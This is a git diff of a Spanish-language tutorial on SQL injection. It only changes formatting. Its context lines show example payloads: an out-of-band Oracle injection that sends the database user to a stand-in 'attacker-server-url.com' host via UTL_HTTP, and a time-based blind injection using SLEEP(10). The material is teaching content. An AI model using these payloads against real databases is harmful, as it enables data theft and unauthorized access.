@@ -31,6 +31,7 @@ Un ataque de inyección SQL exitoso puede:
 <p align="center">
   <img src="../assets/images/que-es-inyeccion-sql\Top_ten_OWASP.png">
 </p> 
+
 *Fuente: https://owasp.org/www-project-top-ten/*
 
 ## Las principales categorías de las inyecciones SQL son:
@@ -72,8 +73,8 @@ SELECT * FROM Products WHERE id='346'||UTL_HTTP.request('http://attacker
 -server-url.com/'||(SELECT user FROM DUAL)) --
 ```
 
- ## 3. Inferential or Blind:  
- A menudo es usado para generar retrasos en la base de datos ( sleep(10) ) o condiciones booleanas (1=1).  
+## 3. Inferential or Blind:  
+A menudo es usado para generar retrasos en la base de datos ( sleep(10) ) o condiciones booleanas (1=1).  
 
 *Ejemplo:*
 
@@ -94,4 +95,4 @@ SELECT * FROM Products WHERE ID='346' - SLEEP(10);
 
 ## Materiales de referencia para Inyección SQL: 
 
-https://slides.com/christophe-cybr/sql-explained 
+[https://slides.com/christophe-cybr/sql-explained](https://slides.com/christophe-cybr/sql-explained)
